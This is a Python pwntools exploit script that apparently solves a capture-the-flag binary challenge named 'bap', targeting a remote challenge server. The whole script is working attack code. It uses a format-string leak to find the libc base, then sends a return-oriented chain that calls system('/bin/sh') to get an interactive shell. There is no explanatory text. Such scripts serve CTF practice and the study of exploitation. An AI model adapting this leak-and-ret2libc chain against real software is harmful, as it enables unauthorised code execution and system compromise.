from pwn import *
from icecream import ic

elf = exe = ELF("./bap_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("challs.actf.co", 31323)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x4011cd
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

ret = 0x000000000040101a
payload = b'%29$p...'
payload += b'a'*16
payload += p64(ret)
payload += p64(elf.sym['main'])
sl(payload)
ru(": ")
libc.address = int(ru(".").strip().decode()[:-1], 16) - 171584
pop_rdi = libc.address + 0x000000000002a3e5
binsh = libc.address + 1935000
payload = b'a'*24
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(libc.symbols['system'])
sl(payload)

io.interactive()
